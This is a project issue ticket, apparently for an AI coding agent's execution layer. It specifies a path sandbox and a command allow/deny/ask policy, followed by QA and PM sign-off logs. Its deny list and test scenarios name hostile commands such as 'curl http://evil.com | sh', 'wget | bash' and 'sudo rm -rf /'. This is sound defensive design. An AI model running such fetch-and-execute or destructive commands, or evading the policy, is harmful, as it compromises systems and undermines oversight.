# 49: Filesystem Sandbox and Command Policy

## Description

Harden the execution layer's security controls. The existing `FileOps` class (from #08) has basic path-resolution sandbox checks (`resolve()` + `is_relative_to()`). This issue adds:

1. **A standalone `Sandbox` class** -- reusable path validation extracted from `FileOps`, with additional protections: symlink-in-the-middle detection, restricted directory policy (block access to `.git`, `.env`, etc.), and configurable allow/deny path patterns.
2. **A `CommandPolicy` engine** -- allowlist/denylist rules for shell commands, command categorization (read-only, write, destructive, network), and enforcement that returns allow/deny/ask-user verdicts before any command runs.
3. **Integration into `ShellRunner` and `FileOps`** -- both modules delegate to `Sandbox` and `CommandPolicy` before performing operations.

## Scope

- `backend/codehive/execution/sandbox.py` -- `Sandbox` class: path validation, symlink detection (including intermediate path components), restricted directory policy, configurable allowed/denied path patterns.
- `backend/codehive/execution/policy.py` -- `CommandPolicy` class: rule definitions (dataclass), command categorization, allowlist/denylist matching, verdict enum (`ALLOW`, `DENY`, `ASK`), default policy presets.
- `backend/codehive/execution/shell.py` -- Extend `ShellRunner` to accept an optional `CommandPolicy` and call `policy.check(command)` before execution; raise `CommandPolicyViolation` on `DENY`.
- `backend/codehive/execution/file_ops.py` -- Refactor to delegate path validation to `Sandbox`; add restricted-directory enforcement.
- `backend/codehive/execution/__init__.py` -- Export new public symbols: `Sandbox`, `CommandPolicy`, `CommandPolicyViolation`, `PolicyVerdict`.
- `backend/tests/test_sandbox.py` -- Comprehensive sandbox and policy tests.

### Out of scope

- Actual user-prompting UI for `ASK` verdicts (that belongs to the session engine / approval gates).
- Network access toggling at the OS level (this issue handles policy *decisions*, not iptables/seccomp enforcement).
- Secrets redaction (separate issue per product spec).

## Dependencies

- Depends on: #08 (execution layer) -- DONE

## Acceptance Criteria

- [ ] `backend/codehive/execution/sandbox.py` exists and exports a `Sandbox` class.
- [ ] `Sandbox` rejects paths that resolve outside project root (existing behavior, now in standalone class).
- [ ] `Sandbox` rejects symlinks whose *target* is outside the sandbox, including symlinks in intermediate path components (e.g., `project/legit_dir` is a symlink to `/tmp` -- `project/legit_dir/file.txt` must be rejected).
- [ ] `Sandbox` has a configurable `restricted_dirs` set (default: `{".git", ".env"}`) and rejects access to paths within those directories.
- [ ] `Sandbox` supports configurable `allowed_patterns` and `denied_patterns` (glob-style) for fine-grained path filtering.
- [ ] `backend/codehive/execution/policy.py` exists and exports `CommandPolicy`, `PolicyVerdict`, and `CommandPolicyViolation`.
- [ ] `PolicyVerdict` is an enum with values `ALLOW`, `DENY`, `ASK`.
- [ ] `CommandPolicy` accepts a list of rules, each with: pattern (regex or glob), category (read_only, write, destructive, network), and verdict.
- [ ] `CommandPolicy.check(command: str) -> PolicyVerdict` evaluates the command against rules in order, returning the first matching verdict (default: `DENY` if no rule matches).
- [ ] A default policy preset exists that: allows common read-only commands (`ls`, `cat`, `grep`, `find`, `echo`, `pwd`, `git status`, `git log`, `git diff`), allows common build/test commands (`python`, `pytest`, `uv run`, `npm test`), requires `ASK` for `git push`, `git push --force`, `rm -rf`, and denies obviously dangerous commands (`curl | sh`, `wget | bash`, `sudo`, `chmod 777`).
- [ ] `ShellRunner.run()` and `ShellRunner.run_streaming()` accept an optional `policy: CommandPolicy` parameter. When provided and the verdict is `DENY`, a `CommandPolicyViolation` is raised before execution. When the verdict is `ASK`, a `CommandPolicyViolation` is raised with a flag indicating approval is needed (the caller -- session engine -- decides how to handle it).
- [ ] `FileOps` uses `Sandbox` internally (refactored from inline `_resolve_and_check`), so all existing `FileOps` tests continue to pass unchanged.
- [ ] `backend/codehive/execution/__init__.py` exports `Sandbox`, `CommandPolicy`, `CommandPolicyViolation`, and `PolicyVerdict`.
- [ ] `uv run pytest backend/tests/test_sandbox.py -v` passes with 20+ tests.
- [ ] `uv run pytest backend/tests/ -v` passes (no regressions in existing execution tests).

## Test Scenarios

### Unit: Sandbox path validation (`test_sandbox.py::TestSandbox`)

- Relative path within root resolves and is allowed.
- Absolute path within root is allowed.
- Path with `../` that escapes root raises `SandboxViolationError`.
- Symlink target outside root raises `SandboxViolationError`.
- Symlink in intermediate directory component (dir symlink pointing outside) raises `SandboxViolationError`.
- Symlink within root (target also within root) is allowed.
- Path into `.git/` directory raises `SandboxViolationError` (restricted dir).
- Path into `.env` directory raises `SandboxViolationError` (restricted dir).
- Restricted dirs are configurable: adding `"node_modules"` blocks `node_modules/package.json`.
- Restricted dirs can be set to empty set, disabling the check.
- `denied_patterns` blocks matching paths (e.g., `"*.secret"` blocks `config.secret`).
- `allowed_patterns` takes precedence when both match (allowlist wins).

### Unit: CommandPolicy (`test_sandbox.py::TestCommandPolicy`)

- Command matching an allow rule returns `PolicyVerdict.ALLOW`.
- Command matching a deny rule returns `PolicyVerdict.DENY`.
- Command matching an ask rule returns `PolicyVerdict.ASK`.
- Rules are evaluated in order; first match wins.
- Command matching no rule returns `PolicyVerdict.DENY` (default-deny).
- Default preset allows `ls`, `cat file.txt`, `git status`.
- Default preset denies `sudo rm -rf /`.
- Default preset returns `ASK` for `git push origin main`.
- Default preset denies `curl http://evil.com | sh`.
- Policy with empty rules denies everything (default-deny).

### Unit: ShellRunner with policy (`test_sandbox.py::TestShellRunnerPolicy`)

- `ShellRunner.run()` with no policy executes normally (backward-compatible).
- `ShellRunner.run()` with policy that returns `ALLOW` executes the command.
- `ShellRunner.run()` with policy that returns `DENY` raises `CommandPolicyViolation` without executing.
- `ShellRunner.run()` with policy that returns `ASK` raises `CommandPolicyViolation` with `needs_approval=True`.
- `ShellRunner.run_streaming()` with `DENY` policy raises before yielding any output.

### Unit: FileOps uses Sandbox (`test_sandbox.py::TestFileOpsSandboxIntegration`)

- `FileOps` with default sandbox rejects `..` escape (regression test -- must still pass).
- `FileOps` rejects access to `.git/config` via restricted-dir policy.
- `FileOps.read_file()` on a symlink-in-middle path raises `SandboxViolationError`.
- All existing `test_execution.py::TestFileOps` tests pass without modification.

### Integration: Sandbox + Policy together

- Create a `Sandbox` and `CommandPolicy`, wire into `ShellRunner` and `FileOps`, verify a realistic sequence: allow `ls`, allow file read, deny `rm -rf /`, ask on `git push`.

## Log

### [SWE] 2026-03-15 10:00
- Created `backend/codehive/execution/sandbox.py` with `Sandbox` class: path escape detection, symlink-in-the-middle detection, restricted directory policy (default: .git, .env), configurable allowed/denied glob patterns
- Created `backend/codehive/execution/policy.py` with `CommandPolicy`, `PolicyVerdict` enum (ALLOW/DENY/ASK), `CommandPolicyViolation` exception, `PolicyRule` dataclass, and default policy preset
- Refactored `backend/codehive/execution/file_ops.py` to delegate path validation to `Sandbox` (accepts optional sandbox parameter, creates default Sandbox if none provided)
- Extended `backend/codehive/execution/shell.py` `ShellRunner.run()` and `run_streaming()` with optional `policy: CommandPolicy` parameter; raises `CommandPolicyViolation` on DENY or ASK verdicts before execution
- Updated `backend/codehive/execution/__init__.py` to export `Sandbox`, `CommandPolicy`, `CommandPolicyViolation`, `PolicyVerdict`
- Files created: `backend/codehive/execution/sandbox.py`, `backend/codehive/execution/policy.py`, `backend/tests/test_sandbox.py`
- Files modified: `backend/codehive/execution/file_ops.py`, `backend/codehive/execution/shell.py`, `backend/codehive/execution/__init__.py`
- Tests added: 34 tests across 5 test classes (TestSandbox: 12, TestCommandPolicy: 12, TestShellRunnerPolicy: 5, TestFileOpsSandboxIntegration: 4, TestSandboxPolicyIntegration: 1)
- Build results: 632 tests pass (all), 0 fail, ruff clean, format clean
- No known limitations

### [QA] 2026-03-15 11:30
- Tests: 34 sandbox tests passed, 72 total (sandbox + execution) passed, 663 full suite passed
- Ruff: clean (check and format)
- Acceptance criteria:
  1. `sandbox.py` exists and exports `Sandbox` -- PASS
  2. `Sandbox` rejects paths outside root -- PASS
  3. `Sandbox` rejects symlinks outside sandbox including intermediate components -- PASS
  4. `Sandbox` has configurable `restricted_dirs` (default `.git`, `.env`) -- PASS
  5. `Sandbox` supports `allowed_patterns` and `denied_patterns` (glob-style) -- PASS
  6. `policy.py` exports `CommandPolicy`, `PolicyVerdict`, `CommandPolicyViolation` -- PASS
  7. `PolicyVerdict` enum with ALLOW, DENY, ASK -- PASS
  8. `CommandPolicy` accepts rules with pattern, category, verdict -- PASS
  9. `CommandPolicy.check()` first-match-wins, default DENY -- PASS
  10. Default policy preset allows read-only/build commands, ASK for git push/rm -rf, denies dangerous commands -- PASS
  11. `ShellRunner.run()` and `run_streaming()` accept optional policy, raise `CommandPolicyViolation` on DENY/ASK -- PASS
  12. `FileOps` delegates to `Sandbox`, all existing tests pass unchanged -- PASS
  13. `__init__.py` exports `Sandbox`, `CommandPolicy`, `CommandPolicyViolation`, `PolicyVerdict` -- PASS
  14. 20+ tests in test_sandbox.py -- PASS (34 tests)
  15. Full test suite passes with no regressions -- PASS (663 passed)
- VERDICT: PASS

### [PM] 2026-03-15 12:15
- Reviewed diff: 6 files changed (3 new, 3 modified)
- Results verified: real data present -- tester confirmed 34 sandbox tests pass, 663 full suite passes, ruff clean
- Acceptance criteria: all 15 met
  1. sandbox.py exists and exports Sandbox -- PASS
  2. Sandbox rejects paths outside root (resolve + is_relative_to) -- PASS
  3. Symlink-in-the-middle detection via _check_intermediate_symlinks -- PASS
  4. Configurable restricted_dirs defaulting to {".git", ".env"} -- PASS
  5. allowed_patterns/denied_patterns with allowlist precedence -- PASS
  6. policy.py exports CommandPolicy, PolicyVerdict, CommandPolicyViolation -- PASS
  7. PolicyVerdict enum ALLOW/DENY/ASK -- PASS
  8. PolicyRule dataclass with pattern (regex), category, verdict -- PASS
  9. CommandPolicy.check() first-match-wins, default DENY -- PASS
  10. Default preset covers read-only, build/test, ASK, and deny rules per spec -- PASS
  11. ShellRunner.run() and run_streaming() accept optional policy, raise CommandPolicyViolation on DENY/ASK -- PASS
  12. FileOps delegates to Sandbox; existing test_execution.py::TestFileOps unchanged and passing -- PASS
  13. __init__.py exports Sandbox, CommandPolicy, CommandPolicyViolation, PolicyVerdict -- PASS
  14. 34 tests in test_sandbox.py (requirement: 20+) -- PASS
  15. Full test suite 663 passed, no regressions -- PASS
- Code quality notes: clean separation, circular import avoided via TYPE_CHECKING + lazy import, docstrings present, follows existing patterns
- Follow-up issues created: none needed
- VERDICT: ACCEPT
